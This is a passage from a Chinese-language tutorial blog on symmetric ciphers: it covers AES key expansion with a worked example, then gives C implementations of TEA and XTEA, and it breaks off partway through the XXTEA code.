“abcd”。接着，对W数组扩充40个新列，构成总共44列的扩展密钥数组。新列以如下的递归方式产生：1.如果i不是4的倍数，那么第i列由如下等式确定：W[i]=W[i-4]⨁W[i-1]2.如果i是4的倍数，那么第i列由如下等式确定：W[i]=W[i-4]⨁T(W[i-1])其中，T是一个有点复杂的函数。函数T由3部分组成：字循环、字节代换和轮常量异或，这3部分的作用分别如下。a.字循环：将1个字中的4个字节循环左移1个字节。即将输入字[b0, b1, b2, b3]变换成[b1,b2,b3,b0]。b.字节代换：对字循环的结果使用S盒进行字节代换。c.轮常量异或：将前两步的结果同轮常量Rcon[j]进行异或，其中j表示轮数。轮常量Rcon[j]是一个字，其值见下表。<br><img src="/2021/120547052/10.png" alt=" ">  </li></ul><pre class="line-numbers language-none"><code class="language-none">下面举个例子：设初始的128位密钥为：3C A1 0B 21 57 F0 19 16 90 2E 13 80 AC C1 07 BD那么4个初始值为：W[0] &#x3D; 3C A1 0B 21W[1] &#x3D; 57 F0 19 16W[2] &#x3D; 90 2E 13 80W[3] &#x3D; AC C1 07 BD下面求扩展的第1轮的子密钥(W[4],W[5],W[6],W[7])。由于4是4的倍数，所以：W[4] &#x3D; W[0] ⨁ T(W[3])T(W[3])的计算步骤如下：循环地将W[3]的元素移位：AC C1 07 BD变成C1 07 BD AC;将 C1 07 BD AC 作为S盒的输入，输出为78 C5 7A 91;将78 C5 7A 91与第一轮轮常量Rcon[1]进行异或运算，将得到79 C5 7A 91，因此，T(W[3])&#x3D;79 C5 7A 91，故W[4] &#x3D; 3C A1 0B 21 ⨁ 79 C5 7A 91 &#x3D; 45 64 71 B0其余的3个子密钥段的计算如下：W[5] &#x3D; W[1] ⨁ W[4] &#x3D; 57 F0 19 16 ⨁ 45 64 71 B0 &#x3D; 12 94 68 A6W[6] &#x3D; W[2] ⨁ W[5] &#x3D;90 2E 13 80 ⨁ 12 94 68 A6 &#x3D; 82 BA 7B 26W[7] &#x3D; W[3] ⨁ W[6] &#x3D; AC C1 07 BD ⨁ 82 BA 7B 26 &#x3D; 2E 7B 7C 9B所以，第一轮的密钥为 45 64 71 B0 12 94 68 A6 82 BA 7B 26 2E 7B 7C 9B  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TEA加密算法"><a href="#TEA加密算法" class="headerlink" title="TEA加密算法"></a>TEA加密算法</h4><ol><li>原理<br>TEA（Tiny Encryption Algorithm）是一种分组加密算法，它的实现非常简单，通常只需要很精短的几行代码。TEA算法使用64位的明文分组和128位的密钥，它使用Feistel分组加密框架，需要进行 64 轮迭代，尽管作者认为 32 轮已经足够了。该算法使用了一个神秘常数δ作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」（也就是程序中的 0×9E3779B9）  </li><li>代码实现  </li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token keyword">void</span> <span class="token function">Encrypt</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span> EntryData<span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token operator">*</span> Key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> x <span class="token operator">=</span> EntryData<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> y <span class="token operator">=</span> EntryData<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> delta <span class="token operator">=</span> <span class="token number">0x9E3779B9</span><span class="token punctuation">;</span>    <span class="token comment">//总共加密32轮</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        sum <span class="token operator">+=</span> delta<span class="token punctuation">;</span>        x <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> Key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>y <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> Key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        y <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> Key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> Key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//最后加密的结果重新写入到数组中</span>    EntryData<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>    EntryData<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Decrypt</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span> EntryData<span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token operator">*</span> Key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> x <span class="token operator">=</span> EntryData<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> y <span class="token operator">=</span> EntryData<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> delta <span class="token operator">=</span> <span class="token number">0x9E3779B9</span><span class="token punctuation">;</span>    sum <span class="token operator">=</span> delta <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span>   <span class="token comment">//注意这里,sum = 32轮之后的黄金分割值. 因为我们要反序解密.</span>    <span class="token comment">//总共加密32轮 那么反序也解密32轮</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// 先将y解开 然后参与运算在解x</span>        y <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> Key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> Key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        x <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> Key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>y <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> Key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//最后加密的结果重新写入到数组中</span>    EntryData<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>    EntryData<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> Data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0x44434241</span><span class="token punctuation">,</span><span class="token number">0x48474645</span><span class="token punctuation">,</span><span class="token number">0x0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"待加密的数值 = %s\r\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0x11223344</span><span class="token punctuation">,</span><span class="token number">0x55667788</span><span class="token punctuation">,</span><span class="token number">0x99AABBCC</span><span class="token punctuation">,</span><span class="token number">0xDDEEFF11</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//Encrypt每次只是加密4字节数组中的两组(也就是每次加密8个字节) 如果你数据多.可以来个for循环来循环加密,但是Entrypt内部还有32次循环,所以速度上还是会有点影响.</span>    <span class="token function">Encrypt</span><span class="token punctuation">(</span>Data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后的数值 = %s\r\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Decrypt</span><span class="token punctuation">(</span>Data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后的数值 = %s\r\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="XTEA机密算法"><a href="#XTEA机密算法" class="headerlink" title="XTEA机密算法"></a>XTEA机密算法</h4><ol><li>原理<br>与TEA加密算法类似，只是增加了更多的密钥表，移位和异或操作等等。  </li><li>代码实现  </li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span>  </span><span class="token keyword">void</span> <span class="token function">encipher</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>      <span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> delta<span class="token operator">=</span><span class="token number">0x9E3779B9</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num_rounds<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          v0 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          sum <span class="token operator">+=</span> delta<span class="token punctuation">;</span>          v1 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum<span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">void</span> <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>      <span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> delta<span class="token operator">=</span><span class="token number">0x9E3779B9</span><span class="token punctuation">,</span> sum<span class="token operator">=</span>delta<span class="token operator">*</span>num_rounds<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num_rounds<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          v1 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum<span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>          v0 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">;</span><span class="token comment">//num_rounds建议取值为32  </span>    <span class="token comment">// v为要加密的数据是两个32位无符号整数  </span>    <span class="token comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前原始数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">encipher</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> v<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后的数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">decipher</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> v<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后的数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="XXTEA加密算法"><a href="#XXTEA加密算法" class="headerlink" title="XXTEA加密算法"></a>XXTEA加密算法</h4><ol><li>原理<br><img src="/2021/120547052/13.png" alt=" ">  </li><li>代码实现  </li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span>  </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">>></span><span class="token number">5</span><span class="token operator">^</span>y<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span><span class="token operator">^</span>z<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token operator">^</span>y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  </span></span><span class="token keyword">void</span> <span class="token function">btea</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token class-name">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token comment">/* Coding Part */</span>      <span class="token punctuation">&#123;</span>          rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span>          sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          z <span class="token operator">=</span> v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">do</span>          <span class="token punctuation">&#123;</span>              sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>              e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">&lt;</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>              <span class="token punctuation">&#123;</span>                  y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              z <span class="token operator">=</span> v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token comment">/* Decoding Part */</span>      <span class="token punctuation">&#123;</span>          n <span class="token operator">=</span> <span class="token operator">-</span>n<span class="token punctuation">;</span>          rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span>          sum <span class="token operator">=</span> rounds<span class="token operator">*</span>DELTA<span class="token punctuation">;</span>          y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">do</span>          <span class="token punctuation">&#123;</span>              e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span>p<span class="token operator">=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>              <span class="token punctuation">&#123;</span>                  z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              z <span class="token operator">=</span> v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>              sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token 